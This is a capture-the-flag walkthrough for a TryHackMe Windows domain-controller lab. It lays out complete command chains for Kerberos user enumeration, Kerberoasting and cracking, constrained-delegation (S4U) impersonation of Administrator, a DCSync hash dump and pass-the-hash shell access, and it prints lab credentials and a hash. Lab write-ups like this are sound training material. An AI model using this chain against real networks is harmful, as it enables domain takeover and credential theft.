# TryHackMe — Crocc Crew: Full Walkthrough

**Room:** <https://tryhackme.com/room/crocccrew>
**Box:** `DC.COOCTUS.CORP` (Windows Server 2019 DC, Build 17763)
**Attack path:** Web recon → Guest SMB access → LDAP enum → Kerberoast → crack → **Constrained Delegation w/ Protocol Transition (S4U)** → impersonate Administrator → DCSync → Evil-WinRM.

> Add the target to `/etc/hosts` first: `echo "<TARGET_IP>  DC.COOCTUS.CORP target.thm" | sudo tee -a /etc/hosts`

---

## Flags at a glance

| Question | Answer |
|---|---|
| User flag | `THM{Gu3st_XXXXX3}` |
| Account Crocc Crew planted | `admCroccCrew` |
| Privileged User's flag | `THM{0n-Y0ur-XXXXXX-DA}` |
| Second Privileged User's flag | `THM{Wh4t-t0-XXXXXXt0-d0}` |
| Root flag | `THM{Cr0ccCXXXXXXes!}` |

---

## 1. Enumeration

### Nmap
```bash
sudo nmap -sC -sV -T4 <TARGET_IP>
```
Key ports: 53 (DNS), **80 (IIS)**, 88 (Kerberos), 135/139/445 (SMB/RPC), **389/636/3268 (LDAP)**, 464 (kpasswd), 3389 (RDP). RDP cert + `rdp-ntlm-info` confirm domain **COOCTUS.CORP**, host **DC**.

### Web (port 80)
```bash
gobuster dir -u http://target.thm -w /usr/share/wordlists/dirb/common.txt \
  -b 404 -x php,xml,txt -t 50 -o gob-1.log
```
Findings: `index.html` (defaced "HACKED BY CROCC CREW" page), `robots.txt`, `backdoor.php`.

`robots.txt` discloses three paths:
```
/robots.txt
/db-config.bak
/backdoor.php
```

`/db-config.bak` leaks DB creds (a **rabbit hole** — not used for the intended path):
```php
$servername = "db.cooctus.corp";
$username    = "C00ctusAdm1n";
$password    = "B4dt0th3b0n3";
```

The defaced page lists "greetz" names — **these are your username candidates**:
```
SP00KY CAKE MILES CRYILLIC VARG HORSHARK DARKSTAR7471 ORIEL NAMELESS0NE SMACKHACK FAWAZ
```

---

## 2. Validate usernames via Kerberos (kerbrute)

Save the greetz names to `users.txt`, then:
```bash
kerbrute userenum -d COOCTUS.CORP --dc target.thm users.txt
```
Valid accounts returned: **CRYILLIC, VARG, FAWAZ**. (Only 3 of 11 exist.)

---

## 3. Guest / Visitor SMB foothold

The `Guest` account (`Visitor`) is enabled with a weak password. Confirm and pull the user flag:
```bash
crackmapexec smb target.thm -u Visitor -p 'GuestLogin!'
smbclient -L //target.thm -U Visitor        # shares: Home, NETLOGON, SYSVOL...
smbclient //target.thm/Home -U Visitor
smb: \> get user.txt
```
```
user.txt → THM{Gu3st_XXXXX3}
```
> **Q: User flag →** `THM{Gu3st_XXXXX3}`

---

## 4. LDAP enumeration → find the planted account + delegation

Anonymous bind is denied — you must bind as `Visitor`. Note the naming context is `DC=COOCTUS,DC=CORP` (the `dc=thm,dc=local` error in `ldapenum.log` is just a wrong base DN attempt).

```bash
# Naming contexts (anonymous is fine for this)
ldapsearch -x -s base namingcontexts -H ldap://target.thm

# Authenticated full dump
ldapsearch -x -b "DC=COOCTUS,DC=CORP" -D "COOCTUS\Visitor" -w 'GuestLogin!' \
  -H ldap://target.thm > ldap_dump.txt

# Or the HTML dump
ldapdomaindump target.thm -u "COOCTUS\Visitor" -p 'GuestLogin!'
```

Two critical findings:
- A backdoor admin account named **`admCroccCrew`**.
- The **`password-reset`** account has an SPN (`HTTP/dc.cooctus.corp`) **and** `msDS-AllowedToDelegateTo: oakley/DC.COOCTUS.CORP...` with the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag — i.e. **constrained delegation with protocol transition**.

> **Q: Planted account →** `admCroccCrew`

---

## 5. Kerberoast the `password-reset` account

Because `password-reset` has an SPN, request its service ticket and crack it:
```bash
impacket-GetUserSPNs -request -dc-ip target.thm COOCTUS.CORP/Visitor:'GuestLogin!'
# copy the $krb5tgs$... hash into hash.txt
john --format=krb5tgs hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Cracked password:
```
password-reset : resetpassword
```

Confirm the delegation rights:
```bash
impacket-findDelegation -dc-ip target.thm COOCTUS.CORP/password-reset:'resetpassword'
# password-reset → Constrained w/ Protocol Transition → oakley/DC.COOCTUS.CORP...
```

---

## 6. Abuse S4U — impersonate Administrator

`password-reset` can delegate to the `oakley/*` SPN with protocol transition, so it can request a ticket **as any user** to that service (S4U2self + S4U2proxy).

```bash
impacket-getST -spn oakley/DC.COOCTUS.CORP \
  -impersonate Administrator \
  "COOCTUS.CORP/password-reset:resetpassword" -dc-ip target.thm
# → Saving ticket in Administrator.ccache

export KRB5CCNAME=Administrator.ccache
klist          # Default principal: Administrator@COOCTUS.CORP
```

> **Note the SPN `oakley/DC.COOCTUS.CORP` (no trailing space).** A common typo (`oakley/DC. COOCTUS...`) will fail silently — that's the empty getST call you'll see if you fat-finger it.

---

## 7. DCSync — dump all domain hashes

With the Administrator ticket loaded, dump NTDS via Kerberos (no password):
```bash
secretsdump.py -k -no-pass DC.COOCTUS.CORP
```
Grab the Administrator NT hash:
```
Administrator:500:aad3b435...:add41095f1fb0405b32f70a489de022d:::
```

---

## 8. Get a shell (Evil-WinRM, pass-the-hash)

```bash
evil-winrm -u Administrator -H add41095f1fb0405b32f70a489de022d -i target.thm
```

Collect the remaining flags:
```powershell
type C:\Shares\Home\priv-esc.txt     # THM{0n-Y0ur-XXXXXX-DA}
type C:\Shares\Home\priv-esc-2.txt   # THM{Wh4t-t0-XXXXXXt0-d0}
type C:\PerfLogs\Admin\root.txt      # THM{Cr0ccCXXXXXXes!}
```

> **Q: Privileged User's flag →** `THM{0n-Y0ur-XXXXXX-DA}`
> **Q: Second Privileged User's flag →** `THM{Wh4t-t0-XXXXXXt0-d0}`
> **Q: Root flag →** `THM{Cr0ccCXXXXXXes!}`

---

## Rabbit holes (don't waste time here)
- `backdoor.php` — dead end.
- `/db-config.bak` MySQL creds (`C00ctusAdm1n:B4dt0th3b0n3`) — dead end.
- `dc=thm,dc=local` LDAP base — wrong domain; use `dc=COOCTUS,dc=CORP`.

## TL;DR one-liner chain
```
Visitor:GuestLogin! → kerberoast password-reset → resetpassword
→ getST -spn oakley/DC.COOCTUS.CORP -impersonate Administrator
→ secretsdump -k -no-pass → evil-winrm -H <admin hash>
```

## Notes / gotchas
- Keep your clock synced to the DC or Kerberos fails: `sudo ntpdate target.thm` (or `sudo rdate -n target.thm`).
- Impacket ≥ 0.11 recommended; the ccache/getST flags here match that.
- The whole delegation abuse hinges on **protocol transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION`) — that's what lets S4U2self mint a usable ticket for a user who never authenticated.